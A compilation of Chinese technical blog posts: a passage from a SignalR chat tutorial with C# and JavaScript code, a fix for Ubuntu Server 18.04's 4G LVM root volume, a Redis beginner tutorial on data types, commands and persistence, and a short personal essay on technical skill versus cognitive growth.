在弹出的对话框中输入 @aspnet/signalr@1.1.2 并选择“选择特定文件”选项，手动选择两个文件 signalr.js/signalr.min.js，注意不要选择默认，否则安装全部组件太浪费时间，对话框中“目标位置”就是 signalr.js/signalr.min.js 的安装位置，默认为 @aspnet/signalr，这里需要手动改成 /lib/signalr/xxx 下面


耐心等待几秒后安装完成...
2. 编写通讯业务逻辑
为了实现一个简单的群发通讯过程，我们需要分别编写服务器和客户端的代码，值得庆幸的是，这些代码非常简单，服务器和客户端的代码一共不到 100 行。
2.1 编写服务端代码
服务器端的代码如下，创建一个 类 WeChatHub 继承自 Hub 类即可，为了方便演示，我还重写了 Hub 的两个方法 OnConnectedAsync（连接）/OnDisconnectedAsync（断开）
 public class WeChatHub : Hub
    {
        public void Send(MessageBody body)
        {
            Clients.All.SendAsync("Recv", body);
        }

        public override Task OnConnectedAsync()
        {
            Console.WriteLine("哇，有人进来了：{0}", this.Context.ConnectionId);
            return base.OnConnectedAsync();
        }

        public override Task OnDisconnectedAsync(Exception exception)
        {
            Console.WriteLine("靠，有人跑路了：{0}", this.Context.ConnectionId);
            return base.OnDisconnectedAsync(exception);
        }
    }

 public class MessageBody
    {
        public int Type { get; set; }
        public string UserName { get; set; }
        public string Content { get; set; }
    }
上面这段代码非常简单，WeChatHub 类 只有一个方法 Send，表示消息入口，其参数接收一个实体类 MessageBody ，这种写法非常有用，后续文章会介绍；现在，先让我们集中精力完成一个群发通信。
2.2 配置 SignalR ，进行依赖注入
 public void ConfigureServices(IServiceCollection services)
        {
            services.AddSignalR();
            ...
        }
2.3 配置 SignalR 路由地址
 public void Configure(IApplicationBuilder app, IHostingEnvironment env)
        {
            app.UseSignalR(routes =>
            {
                routes.MapHub<WeChatHub>("/wechatHub");
            });
            ...
        }

到这里，服务器基架已搭建完成

2.4 编写客户端代码
为了在 Web 浏览器中使用 SignalR，我们编写了一小段 js 代码到文件 wechat.js，并将其和 signalr.js 引入到 Html 页面中，客户端 wechat.js 代码如下：
"use strict";

var connection = new signalR.HubConnectionBuilder()
    .withUrl("/wechatHub")
    .build();

connection.on("Recv", function (data) {
    var li = document.createElement("li");
    li = $(li).text(data.userName + "：" + data.content)
    $("#msgList").append(li);
});

connection.start()
    .then(function () {
        console.log("SignalR 已连接");
    }).catch(function(err) {
        console.log(err);
    });

$(document).ready(function () {
    $("#btnSend").on("click", () => {
        var userName = $("#userName").val();
        var content = $("#content").val();
        console.log(userName + ":" + content);
        connection.invoke("send", { "Type": 0, "UserName": userName, "Content": content });
    });
});
这段代码需要稍微解释一下。首先，创建了一个 SignalR 的 connection 对象，紧接着，马上使用 connection 绑定了一个事件，该事件的名称和服务器 Send 方法中第一个参数的值相呼应，通过这种绑定，客户端就可以接收到服务器推送过来的消息，反之，通过 connection.invoke("send",xxx)，也可以将消息发送到服务器端的 Send 方法中
3. 测试消息推送
为了直观的演示通讯的过程，我简单写了一点 Html 样式代码（并非我所擅长），首先我们来看看 SignalR 的连接过程，定位到项目根目录，使用 dotnet run 启动服务，看到如下画面：
3.1 启动服务

3.2 查看 SignalR 连接过程
输入网站： http://localhost:5000/ 访问网站，看到如下画面红框处，表示连接成功

看看服务器的输出内容

3.3 开始发送消息
为了演示消息过程，我们分别打开两个浏览器窗口，模拟两个人在群聊，同时，把他们的消息打印到网页上，最终效果图如下

非常完美，现在所有通过 http://localhost:5000 地址访问该站点的人，都可以同时收到其它人发送的消息了。
结束语
开篇已结束，关于 SignalR 的原理性内容，在开篇文章中不会涉及，快速上手才有兴趣深入，这和谈恋爱好像有点不同，逃~；下一篇将在本文的基础上，加入一些实际应用上的内容，最终，完成一个可以商业应用的例子，本系列的所有代码都会托管到 GitHub，欢迎大家下载和 Star，感谢您的点赞！
演示代码下载
https://github.com/lianggx/Examples/tree/master/SignalR/Ron.SignalRLesson1

********************************************************************************************************************************************************************************************************
Ubuntu 18.04 根目录为啥只有 4G 大小
其实准确点儿的描述应该是：Ubuntu Server 18.04 ，设置 LVM，安装完成后根目录的容量为什么只有 4G？只有 Server 版有问题，Desktop 版没有问题，Ubuntu 16.04 的 Server 版和 Desktop 版都没有这样的问题。
笔者在 vSphere 中安装虚机 Ubuntu Server 18.04.2，设置磁盘大小为 200G，文件系统设置时选择 LVM ，也就是 "Use An Entire Disk And Set Up LVM"，如下图所示：

其他都是默认值，安装很顺利，但是进入系统后检查文件系统发现根目录的容量只有区区 4G：

这是咋回事儿？说好的 200G 呢？
如何解决？
其实如果有些 LVM 的基础知识处理这个问题是很简单的。先看看 PV 的信息：

PV 的状态没有问题，接着检查 VG 的容量：

VG 的容量也是正确的，并且大部分空闲。接着检查 LV 的容量：

原来问题出在这里，199G 的 VG，而 LV 只分到了 4G。问题找到了，解决方式也很简单，先扩展 LV，再扩展文件系统！
直接把 VG 剩余的所有空间分给 LV：

$ sudo lvextend /dev/ubuntu-vg/ubuntu-lv /dev/sda3


再 resize 文件系统就可以了：

$ sudo resize2fs /dev/ubuntu-vg/ubuntu-lv


检查结果：

搞定！
是不是漏了什？
到底是哪里出了问题？Ubuntu Desktop 18.04 可没有这样的问题！不会是和虚拟环境 vSphere 有关吧？带着种种疑问在网上搜了一通，其实在 Ubuntu 18.04 的 Release Notes 中就说明了这是个已知问题(Known issues)：LVM Entire Disk option does not use entire disk (1785321) 

去看看这个问题的详细信息，发现这貌似并不是一个 bug，而是一个 design。人家本来的目的是让管理员能够更加方便、合理的使用 LVM，从而改进了默认的设置(对比 Ubuntu Server 16.04)：

The reason only 4GiB is allocated to the root file-system is that the remaining space is there to be allocated for other purposes by the system administrator.

E.g. The administrator may want to allocated separate block devices to host virtual machine or container images, and so on.

大意是说：只分配 4G 给根文件系统的原因是剩余的空间由系统管理员分配给其他用途。管理员可能希望分配单独的块设备来承载虚拟机或容器映像，等等。
只不过这个 design 让笔者这种喜欢默认值的用户突然感到了不适应(至少这个行为和 Ubuntu 16.04 不一样，和 Ubuntu 18.04 Desktop 也不一样)。顿时感觉无比 shallow，距离系统管理员还有不小的差距啊！既然被标记成了 issue ，估计在后面的版本中会有调整。
在安装系统时解决该问题
其实如果在安装系统时，仔细看看默认的配置(出问题前谁会看呢？)就会发现这个问题：

文件系统的详细配置中已经指明了根目录所挂载的文件系统所在的 LV 容量为 4G，编辑该 LV 的配置信息，把默认值改为允许的最大值就可以了：

其他的配置继续应用默认值，这次安装完成后根目录的容量就是我们期望的值(不是 200G噢，实际只有 195G 左右)。
总结
在对这个问题的认知过程中，笔者刚开始一直受困于自己的经验，认为 Ubuntu 16.04 的 Server 版和 Desktop 版都没有这样的问题，Ubuntu 18.04 的 Desktop 版也没有这样的问题，那就一定是 Ubuntu Server 18.04 的问题。这样的习惯性思维导致了笔者无法以更广阔的视角看待这个问题，如果笔者是一个真正的 Linux 系统管理员，说不定正喜大普奔呢！
参考：LVM Entire Disk option does not use entire disk (1785321) 
********************************************************************************************************************************************************************************************************
Redis入门教程（二）
推荐阅读：
Redis入门教程（一）https://www.cnblogs.com/jichi/p/10285346.html
5. Redis 的数据结构
5.1 Redis 数据结构介绍
redis是一种高级的key-value的存储系统, 其中value支持五种数据类型｡
1､字符串(String)
2､哈希(hash)
3､字符串列表(list)
4､字符串集合(set)
5､有序字符串集合(sorted set)
而关于key 的定义呢,需要大家注意的几点:
1､key 不要太长, 最好不要操作1024 个字节,这不仅会消耗内存还会降低查找效率
2､key 不要太短,如果太短会降低key 的可读性
3､在项目中, key 最好有一个统一的命名规范
5.2 存储string
5.2.1 概述
字符串类型是Redis中最为基础的数据存储类型,它在Redis中是二进制安全的,这便意味着该类型在存入和获取的数据相同｡在Redis中字符串类型的Value最多可以容纳的数据长度为512M｡
5.2.2 常用命令
5.2.2.1 赋值
• set key value:设定key 持有指定的字符串value,如果该key 存在则进行覆盖操作｡总是返回ok｡
5.2.2. 2 取值
• get key :获取key 的value ｡如果与该key 关联的value 不是String 类型,redis将返回错误信息,因为get 命令只能用于获取String value;如果该key 不存在,返回(nil)｡
• getset key value:先获取该key 的值,然后在设置该key 的值｡
5.2.2.3 删除
• del key:删除指定key

5.2.2.4 数值增减
• incr key :将指定的key 的value 原子性的递增1.如果该key 不存在,其初始值为0 ,在incr之后其值为1 ｡如果value的值不能转成整型,如hello,该操作将执行失败井返回相应的错误信息｡

• decr key : 将指定的key 的value 原子性的递减1.如果该key 不存在,其初始值为0 , 在decr 之后其值为-1 ｡如果value的值不能转成整型,如hello,该操作将执行失败并返回相应的错误信息｡

5.2.2.5其他命令
• incrby key increment :将指定的key 的value 原子性增加increment,如果该key 不存在,器初始值为0 , 在incrby 之后,该值为increment ｡如果该值不能转成整型,如hello 则失败井返回错误信息｡

• append key value:拼凑字符串｡如果该key存在,则在原有的value 后追加该值;如果该key 不存在,则重新创建一个key/value

5.3 存储hash
5.3.1 概述
Redis中的Hash 类型可以看成具有String Key 和String Value 的map 容器｡所以该类型非常适合于存储值对象的信息｡如Username､Password 和Age 等｡如果Hash 中包含很少的字段,那么该类型的数据也将仅占用很少的磁盘空间｡每一个Hash 可以存储4294967295 个键值对｡
5.3.2 常用命令
5.3.2.1 赋值
• hset key field value:为指定的key设定field/value对(键值对)｡

• hmset key field value [field2 value2 ... ]:设置key中的多个filed/value｡

5.3.2.2 取值
• hget key field:返回指定的key中的field的值

• hmget key fileds:获取key 中的多个filed 的值

• hgetall key:获取key 中的所有filed-value

5.3.2.3 删除
• hdel key field [field …]:可以删除一个或多个字段,返回值是被删除的字段个数


• del key:删除整个 list

5.3.2.4 增加数字
• hincrby key field increment:设置key 中filed 的值增加increment,如:age增加20

5.3.3 自学命令
• hexists key field:判断指定的key 中的filed 是否存在

• hlen key:获取key 所包含的field 的数量

• hkeys key :获得所有的key

• hvals key:获得所有的value

5.4 存储list
5.4.1 概述
在Redis中,List类型是按照插入顺序排序的字符串链表｡和数据结构中的普通链表一样,我们可以在其头部(left)和尾部(right)添加新的元素｡在插入时,如果该键并不存在, Red is将为该键创建一个新的链表｡与此相反,如果链表中所有的元素均被移除,那么该键也将会被从数据库中删除｡
List 中可以包含的最大元素数量是4294967295 ｡
从元素插入和删除的效率视角来看, 如果我们是在链表的两头插入或删除元素, 这将会是非常高效的操作,即使链表中己经存储了百万条记录,该操作也可以在常量时间内完成｡然而需要说明的是, 如果元素插入或删除操作是作用于链表中间, 那将会是非常低效的｡相信对于有良好数据结构基础的开发者而言,这一点并不难理解｡
1､ArrayList使用数组方式存储数据,所以根据索引查询数据速度快,而新增或者删除元素时需要涉及到位移操作,所以比较慢｡
2､LinkedList 使用双向链接方式存储数据,每个元素都记录前后元素的指针,所以插入､删除数据时只是更改前后元素的指针指向即可,速度非常快,然后通过下标查询元素时需要从头开始索引,所以比较慢｡
5.4.2 常用命令
5.4.2.1 两端添加
• lpush key values[valuel value2 ... ]:在指定的key 所关联的list 的头部插入所有的values,如果该key 不存在,该命令在插入之前创建一个与该key 关联的空链表,之后再向该链表的头部插入数据｡插入成功,返回元素的个数｡

• rpush key values[valuel､value2... ]:在该list 的尾部添加元素｡

5.4.2.2 查看列表
• lrange key start end : 获取链表中从start 到end 的元素的值,start､end 从0 开始计数;也可为负数,若为-1 则表示链表尾部的元素,- 2则表示倒数第二个,依次类推..

5.4.2.3 两端弹出
• lpop key:返回并弹出指定的key 关联的链表中的第一个元素, 即头部元素｡如果该key 不存在,返回nil;若key 存在,则返回链表的头部元素｡

• rpop key:从尾部弹出元素｡

5.4.2.4 获取列表中元素的个数
• llen key:返回指定的key 关联的链表中的元素的数量｡

5.4.3 扩展命令(了解)
• lpushx key value:仅当参数中指定的key 存在时,向关联的list的头部插入value｡如果不存在,将不进行插入｡

• rpushx key value:在该list的尾部添加元素

• lrem key count value:删除count个值为value的元素,如果count 大于0,从头向尾遍历并删除count 个值为value 的元素,如果count 小于0,则从尾向头遍历并删除｡如果count 等于0,则删除链表中所有等于value 的元素｡
• lset key index value:设置链表中的index的脚标的元素值,0代表链表的头元素,-1代表链表的尾元素｡操作链表的脚标不存在则抛异常｡

• linsert key before I after pivot value : 在pivot 元素前或者后插入value 这个元素｡

• rpoplpush resource destination:将链表中的尾部元素弹出井添加到头部｡[循环操作]
5.4.4 使用场景
rpoplpush的使用场景:
Redis链表经常会被用于消息队列的服务,以完成多程序之间的消息交换｡假设一个应用程序正在执行LPUSH操作向链表中添加新的元素,我们通常将这样的程序称之为"生产者(Producer)",而另外一个应用程序正在执行RPOP 操作从链表中取出元素,我们称这样的程序为"消费者(Consumer)"｡如果此时,消费者程序在取出消息元素后立刻崩溃,由于该消息已经被取出且没有被正常处理,那么我们就可以认为该消息己经丢失,由此可能会导致业务数据丢失,或业务状态的不一致等现象的发生｡然而通过使用RPOPLPUSH 命令,消费者程序在从主消息队列中取出消息之后再将其插入到备份队列中,直到消费者程序完成正常的处理逻辑后再将该消息从备份队列中删除｡同时我们还可以提供一个守护进程,当发现备份队列中的消息过期时,可以重新将其再放回到主消息队列中,以使其它的消费者程序继续处理｡

5.5存储set
5.5.1 概述
在Redis中,我们可以将Set类型看作为没有排序的字符集合,和List类型一样,我们也可以在该类型的数据值上执行添加､删除或判断某一元素是否存在等操作｡需要说明的是,这些操作的时间复杂度为O(1),即常量时间内完成操作｡Set可包含的最大元素数量是4294967295｡
和List 类型不同的是, Set集合中不允许出现重复的元素,这一点和C++标准库中的set容器是完全相同的｡换句话说,如果多次添加相同元素, Set中将仅保留该元素的一份拷贝｡和List 类型相比, Set 类型在功能上还存在着一个非常重要的特性,即在服务器端完成多个Sets之间的聚合计算操作,如unions､intersections 和differences｡由于这些操作均在服务端完成,因此效率极高,而且也节省了大量的网络IO开销｡
5.5.2 常用命令
5.5.2.1 添加/删除元素
• sadd key values[value1､value2 …]:向set中添加数据,如果该key 的值己有则不会重复添加

• srem key members [member1､member2...]:删除set 中指定的成员

5.5.2.2 获得集合中的元素
• smembers key:获取set 中所有的成员

• sismember key member:判断参数中指定的成员是否在该set中,1表示存在,0示不存在或者
该key 本身就不存在｡(无集合中有多少元素都可以极速的返回结果)

5.5.2.3 集合的差集运算A-B
• sdiff key1 key2:返回key1与key2中相差的成员,而且与key的顺序有关｡即返问空值｡

5.5.2.4 集合的交集运算A n B
• sinter key1 key2 key3 . . .:返回交集｡

5.5.2.5 集合的并集运算A U B
• sunion key1 key2 key3 . . . :返回并集｡

5.5.3 扩展命令( 了解)
• scard key:获取set 中成员的数量

• srandmember key:随机返回set 中的一个成员

• sdiffstore destination key1 key2 ...:将key1､key2相差的成员存储在destination 上

• sinterstore destination key[key ...]:将返回的交集存储在destination 上

• sunionstore destination key[key ...]:将返回的并集存储在destination 上

5.5.4 使用场景
1､可以使用Redis的Set数据类型跟踪一些唯一性数据,比如访问某一博客的唯一IP 地址信息｡对于此场景,我们仅需在每次访问该博客时将访问者的IP 存入Red is 中, Set 数据类型会自动保证IP
地址的唯一性｡
2､充分利用Set 类型的服务端聚合操作方便､高效的特性,可以用于维护数据对象之间的关联关系｡
比如所有购买某一电子设备的客户ID被存储在一个指定的Set 中,而购买另外一种电子产品的客户ID被存储在另外一个Set 中,如果此时我们想获取有哪些客户同时购买了这两种商品时,Set 的intersections命令就可以充分发挥它的方便和效率的优势了｡
5.6 存储sortedset
5.6.1 概述
Sorted-Set和Set 类型极为相似,它们都是字符串的集合,都不允许重复的成员出现在一个Set中｡它们之间的主要差别是Sorted-Set 中的每一个成员都会有一个分数(score)与之关联, Redis正是通过分数来为集合中的成员进行从小到大的排序｡然而需要额外指出的是, 尽管Sorted-Set 中的成员必须是唯一的,但是分数(score)却是可以重复的｡
在Sorted-Set 中添加､删除或更新一个成员都是非常快速的操作,其时间复杂度为集合中成员数量的对数｡由于Sorted-Set 中的成员在集合中的位置是有序的,因此,即便是访问位于集合中部的成员也仍然是非常高效的｡事实上,Redis所具有的这一特征在很多其它类型的数据库中是很难实现的,换句话说,在该点上要想达到和Red is 同样的高效,在其它数据库中进行建模是非常困难的｡
例如: 游戏排名､微博热点话题等使用场景｡
5.6.2 常用命令
5.6.2.1 添加元素
• zadd key score member score2 member2 ...:将所有成员以及该成员的分数存放到sorted-set 中｡
如果该元素己经存在则会用新的分数替换原有的分数｡返回值是新加入到集合中的元素个数,
不包含之前已经存在的元素｡

5.6.2.2 获得元素
• zscore key member:返回指定成员的分数

• zcard key:获取集合中的成员数量

5.6.2.3 删除元素
• zrem key member[member…]:移除集合中指定的成员,可以指定多个成员｡

5.6.2.4 范围查询
• zrange key start end [withscores]:获取集合中脚标为start-end 的成员,[with scores]参数表明返回的成员包含其分数｡

• zremrangebyrank key start stop : 按照排名范围删除元素

• zremrangebyscore key min max : 按照分数范围删除元素

5.6.3 扩展命令(了解)
• zrangebyscore key min max [withscores] [limit offset count]: 返回分数在[min, max]的成员并按照分数从低到高排序｡
[withscores]:显示分数
[limit offset count]: offset表明从脚标为offset的元素开始并返回count 个成员｡

• zincrby key increment member:设置指定成员的增加的分数｡返回值是更改后的分数｡

• zcount key min max : 获取分数在[min,max]之间的成员

• zrank key member:返回成员在集合中的排名｡(从小到大)

• zrevrank key member:返回成员在集合中的排名｡(从大到小>

5.6.4 使用场景
1､可以用于一个大型在线游戏的积分排行榜｡每当玩家的分数发生变化时,可以执行ZADD 命令更新玩家的分数,此后再通过ZRANGE 命令获取积分TOPTEN 的用户信息｡当然我们也可以利用ZRANK命令通过username 来获取玩家的排行信息｡最后我们将组合使用ZRANGE 和ZRANK 命令快速的获取和某个玩家积分相近的其他用户的信息｡
2､Sorted-Set 类型还可用于构建索引数据｡
6. keys 的通用操作
• keys pattern:获取所有与pattern匹配的key,返回所有与该key匹配的keys｡*表示任意一个或多个字符,?表示任意一个字符｡

• del key1 key2 ...:删除指定的key

• exists key:判断该key是否存在, 1代表存在,0代表不存在

• rename key newkey:为当前的key 重命名
• expire key:设置过期时间,单位:秒

• ttl key:获取该key 所剩的超时时间,如果没有设置超时,返回-1｡如果返回表示超时不存在｡

• type key:获取指定key 的类型｡该命令将以字符串的格式返回｡
list､set､hash 和zset ,如果key 不存在返回none ｡

7.Redis 特性
7. 1 多数据库
7.1.1 概念
一个Redis实例可以包括多个数据库, 客户端可以指定连接某个redis实例的哪个数据库, 就好比一个mysql中创建多个数据库,客户端连接时指定连接哪个数据库｡
一个redis实例最多可提供16个数据库,下标从0 到15,客户端默认连接第0 号数据库,也可以通过select选择连接哪个数据库,如下连接1 号库:

连接0 号数据库:

7.1.2 将newkey移植到1号库
• move newkey 1 : 将当前库的key 移植到1 号库中

7.2 服务器命令
• ping:测试连接是否存活

//执行下面命令之前,我们停止redis服务器
redis 127.0.0.1:6379> ping
Could not connect to Redis at 127.0.0.1:6379: Connection refused
• echo:在命令行打印一些内容

• select:选择数据库｡Redis数据库编号从0~15,可以选择任意一个数据库来进行数据的存取｡
当选择16 时,报错,说明没有编号为16的这个数据库
• quit:退出连接
• dbsize:返回当前数据库中key 的数目｡

• info:获取服务器的信息和统计｡

• flushdb:删除当前选择数据库中的所有key｡

• flushall:删除所有数据库中的所有key ｡

在本例中我们先查看了一个1号数据库中有一个key,然后我切换到0号库执行flushall命令,结果1 号库中的key 也被清除了,说明命令工作正常｡
7.3 消息订阅与发布
• subscribe channel:订阅频道,例:subscribe mychat,订阅mychat 这个频道
• psubscribe channel*:批量订阅频道,例: psubscribe s*,订阅以s开头的频道
• publish channel content:在指定的频道中发布消息,如publish mychat 'today is a newday'
•步骤1:在第一个连接中,订阅mychat频道｡此时如果没有人"发布"消息,当前窗口处于等待状态｡

•步骤2:在另一个窗口中,在mychat频道中,发布消息｡


•步骤3:再第三个窗口,批量订阅以my 开头所有频道｡

•步骤4:在第二个窗口,分别在"mychat"和"mychat2"发布消息｡


7.4redis 事务
7.4.1 概念
和众多其它数据库一样,Redis作为NoSQL数据库也同样提供了事务机制｡在Redis中,MU LTI/EXEC/DISCARD/这三个命令是我们实现事务的基石｡
7.4.2 redis 事务特征
1､在事务中的所有命令都将会被串行化的顺序执行,事务执行期间,Redis不会再为其它客户端的请求提供任何服务, 从而保证了事物中的所有命令被原子的执行
2､和关系型数据库中的事务相比, 在Redis 事务中如果有某一条命令执行失败,其后的命令仍然会被继续执行｡
3､我们可以通过MULTI 命令开启一个事务,有关系型数据库开发经验的人可以将其理解为BEGIN TRANSACTION语句｡在该语句之后执行的命令都将被视为事务之内的操作,最后我们可以通过执行EXEC/DISCARD命令来提交/回滚该事务内的所有操作｡这两个Redis命令可被视为等同于关系型数据库中的COMMIT/ROLLBACK 语句｡
4､在事务开启之前,如果客户端与服务器之间出现通讯故障并导致网络断开,其后所有待执行的语句都将不会被服务器执行｡然而如果网络中断事件是发生在客户端执行EXEC 命令之后,那么该事务中的所有命令部会被服务器执行｡
5､当使用Append-Only模式时, Redis会通过调用系统函数write将该事务内的所有写操作在本次调用中全部写入磁盘｡然而如果在写入的过程中出现系统崩溃,如电源故障导致的宕机,那么此时也许只有部分数据被写入到磁盘,而另外一部分数据却已经丢失｡Redis服务器会在重新启动时执行一系列必要的一致性检测, 一旦发现类似问题, 就会立即退出并给出相应的错误提示｡
此时,我们就要充分利用Redis工具包中提供的redis-check-aof 工具,该工具可以帮助我们定位到数据不一致的错误,并将己经写入的部分数据进行回滚｡修复之后我们就可以再次重新启动Redis服务器了｡
7.4.3 命令解释
• multi:开启事务用于标记事务的开始,其后执行的命令都将被存入命令队列,直到执行EXEC时,这些命令才会被原子的执行,类似与关系型数据库中的:begi n transaction
• exec:提交事务,类似与关系型数据库中的:commit
• discard:事务回滚,类似与关系型数据库中的:rollback
7.4.4 测试
7.4.4.1 正常执行事务
• 步骤1:在窗口1,设置num,并设置数据

• 步骤2:在窗口2, num累加1,并获得数据

• 步骤3:在窗口1,获得数据

• 步骤4:在窗口1,开启事务,多次累加数据｡

• 步骤5:在窗口2,获得数据

• 步骤6:提交事务

7.4.4.2 回滚

7.4.4.3 失败命令

8.redis持久化
8.1 概述
Redis的高性能是由于其将所有数据都存储在了内存中,为了使Redis在重启之后仍能保证数据不丢失,需要将数据从内存中同步到硬盘中,这一过程就是持久化｡
Redis支持两种方式的持久化,一种是RDB方式,一种是AOF方式｡可以单独使用其中一种或将二者结合使用｡
1､RDB 持久化(默认支持,无需配置)
该机制是指在指定的时间问隔内将内存中的数据集快照写入磁盘｡
2､AOF 持久化
该机制将以日志的形式记录服务器所处理的每一个写操作,在Redis服务器启动之初会读取该文件来重新构建数据库,以保证启动后数据库中的数据是完整的｡
3､无持久化
我们可以通过配置的方式禁用Redis服务器的持久化功能,这样我们就可以将Redis视为一个功能加强版的memcached了｡
4､redis可以同时使用RDB 和AOF
8.2RDB
8.2.1 优势
1､一旦采用该方式,那么你的整个Redis数据库将只包含一个文件,这对于文件备份而言是非常完美的｡比如,你可能打算每个小时归档一次最近24 小时的数据,同时还要每天归档一次最近30天的数据｡通过这样的备份策略,一旦系统出现灾难性故障, 我们可以非常容易的进行恢复｡
2､对于灾难恢复而言,RDB是非常不错的选择｡因为我们可以非常轻松的将一个单独的文件压缩后再转移到其它存储介质上
3､性能最大化｡对于Redis的服务进程而言,在开始持久化时,它唯一需要做的只是fork
出子进程,之后再由子进程完成这些持久化的工作,这样就可以极大的避免服务进程执行操
作了｡
4､相比于AOF 机制,如果数据集很大,RDB的启动效率会更高｡
8.2.2 劣势
1､如果你想保证数据的高可用性,即最大限度的避免数据丢失,那么RDB 将不是一个很好的选择｡
因为系统一旦在定时持久化之前出现宕机现象,此前没有来得及写入磁盘的数据都将丢失｡
2､由于RDB是通过fork 子进程来协助完成数据持久化工作的,因此,如果当数据集较大时,可能会导致整个服务器停止服务几百毫秒,甚至是1 秒钟
8.2.3 配置说明Snapshotting
8.2.3.1 快照参数设置
• save 900 1 #每900秒(15分钟)至少有1 个key发生变化,则dump 内存快照｡
• save 300 10 #每300秒(5分钟)至少有10 个key 发生变化,则dump 内存快照｡
• save 60 10000 #每60 秒(1 分钟)至少有10000个key 发生变化,则dump 内存快照｡

8.2.3.2 保存位置设置

8.3AOF
8.3.1 优势
1､该机制可以带来更高的数据安全性, 即数据持久性｡Red is 中提供了3 中同步策略, 即每秒同步､每修改同步和不同步｡事实上,每秒同步也是异步完成的,其效率也是非常高的,所差的是一旦系统出现右机现象, 那么这一秒钟之内修改的数据将会丢失｡而每修改同步, 我们可以将其视为同步持久化,即每次发生的数据变化都会被立即记录到磁盘中｡可以预见, 这种方式在效率上是最低的｡至于无同步,无需多言,我想大家都能正确的理解它｡
2､由于该机制对日志文件的写入操作采用的是append 模式,因此在写入过程中即使出现宕机现象,也不会破坏日志文件中己经存在的内容｡然而如果我们本次操作只是写入了一半数据就出现了系统崩溃问题,不用担心,在Redis下一次启动之前,我们可以通过red is-check-aof 工具来帮助我们解决数据一致性的问题｡
3､如果日志过大,Redis可以自动启用rewrite机制｡即Redis 以append 模式不断的将修改数据写入到老的磁盘文件中, 同时Redis 还会创建一个新的文件用于记录此期间有哪些修改命令被执行｡
因此在进行rewrite 切换时可以更好的保证数据安全性｡
4､AOF 包含一个格式清晰､易于理解的日志文件用于记录所有的修改操作｡事实上,我们也可以通过该文件完成数据的重建｡
8.3.2 劣势
1､对于相同数量的数据集而言,AOF文件通常要大于RDB 文件
2､根据同步策略的不同,AOF在运行效率上往往会慢于RDB｡总之,每秒同步策略的效率是比较高的,同步禁用策略的效率和RDB 一样高效｡
8.3.3 配置AOF
8.3.3.1 配置信息
• always #每次有数据修改发生时都会写入AOF 文件
• everysec #每秒钟同步一次, 该策略为AOF 的缺省策略
• no #从不同步｡高效但是数据不会被持久化
重写AOF :若不满足重写条件时,可以手动重写,命令: bgrewriteaof

策略的选择:

 
8.3.3.2 数据恢复演示
1､flushall操作清空数据库
2､及时关闭redis 服务器( 防止dump . rdb )｡shutdown nosave
3､编辑aof文件,将日志中的flushall命令删除并重启服务即可
• 步骤1 : 开启a op , 并设置成总是保存｡然后重启red is ｡


• 步骤2 : 在窗口1 进行若干操作

• 步骤3 : 在窗口1 , 清空数据库

• 步骤4 : 在窗口2 , 关闭redis

• 步骤5 : 修改"appendonly.aof"文件,将最后的命令"flushall"删除

• 步骤6 : 在窗口1 启动redis,然后查询数据库内容

9.redis 使用场景
1､取最新N 个数据的操作
比如典型的取你网站的最新文章,通过下面方式,我们可以将最新的5000 条评论的ID 放在Red is的Li st 集合中, 并将超出集合部分从数据库获取
2､排行榜应用,取TOP N 操作
这个需求与上面需求的不同之处在于, 前面操作以时间为权重,这个是以某个条件为权重,比如按顶的次数排序,这时候就需要我们的sorted set 出马了,将你要排序的值设置成so rted set 的sco re ,将具体的数据设置成相应的va lu e , 每次只需要执行一条ZADD 命令即可｡
3､需要精准设定过期时间的应用
比如你可以把上面说到的sorted set 的score 值设直成过期时间的时间戳, 那么就可以简单地通过过期时间排序,定时清除过期数据了,不仅是清除Redis 中的过期数据,你完全可以把Redis 里这个过期时间当成是对数据库中数据的索引, 用Redis来找出哪些数据需要过期删除,然后再精准地从数据库中删除相应的记录｡
4､计数器应用
Redis的命令都是原子性的,你可以轻松地利用INCR , DECR 命令来构建计数器系统｡
5､Uniq操作,获取某段时间所有数据排重值
这个使用Redis 的set数据结构最合适了,只需要不断地将数据往set中扔就行了, set 意为集合, 所以会自动排重｡
6､实时系统,反垃圾系统
通过上面说到的set 功能,你可以知道一个终端用户是否进行了某个操作,可以找到其操作的集合并进行分析统计对比等｡
7､Pub/Sub 构建实时消息系统
Redis的Pub/Sub 系统可以构建实时的消息系统,比如很多用Pub/Sub构建的实时聊天系统的例子｡
8､构建队列系统
使用list 可以构建队列系统,使用sorted set 甚至可以构建有优先级的队列系统｡
此为本人学习笔记总结，整合网上资料。希望大家能顺利入门。
********************************************************************************************************************************************************************************************************
我的小纠结，技术与认知哪个更重要？

最近写了几篇关于思想认知的文章，虽说可能会有一些鸡汤类的东西，但都是我自身的感悟和经历，是自己思考过的内容才分享出来，也得到一些读者的关注点赞，基本来说反馈都还不错，当然也少不了诋毁的，这都是正常现象。
但是总感觉哪哪不对，好像有个小疙瘩没解开，晚上洗脚的时候，突然灵光乍现，一个观点蹦出在我的脑子里，就是本篇标题 "技术与认知哪个更重要"。也顺带解开了我的疑惑，看来以后有疑惑还得多泡泡脚，促进一下血液循环，激发一下脑回路。
为什么说这个，因为这个问题其实一直在伴随着我，只是自己没有在意，让我们选肯定会说两个都重要，但这个世界就是这么奇怪，两个选项的问题，总是让你选一个或着两者之间权衡兼顾。总之都很纠结。
场景是这样的，技术人走上这条路，如果不想当一个普通的码农，那就得付出足够的辛劳汗水，才可能走向架构师或者管理岗或更高职位。以前我的眼里只有技术，哼哧哼哧努力了这么多年，走上这些岗位后发现技术人的一些思维弊端出现了。我叫做计算机思维模式，具体可以看一下另一篇<骄傲的技术人，技术是你的全部吗>。
然后就想做出一些调整，当然不是说放弃技术不干这个了，而是说应该兼顾一下自己的思维开发，开阔一下眼界了。于是乎开启了自己的阅读之路，同时也开启了自己的分享之路。
这时候矛盾来了，即不想放弃技术，又想兼顾思想认知，开阔眼界。可时间就那么多，除过上班时间，还有些其他事情要干，留给自己的时间并不多，这时候我深深的意识到，时间是个多么宝贵的东西。
怎么办呢，起初我就搅在了一起，一会技术一会阅读，一会阅读一会技术，十分刻意的去安排，生怕耽搁了任何一个，后来发现好累啊。怎么会这样，感觉有点不知所措，但又不想放弃任何一个。
其实我洗脚之前，这个问题已经解决了，可能不是完美的，但至少自己感觉舒服了。什么时候形成的我也没有印象了，而前面的疑惑小疙瘩就是没把这个事情想明白，自己到底发生了什么。
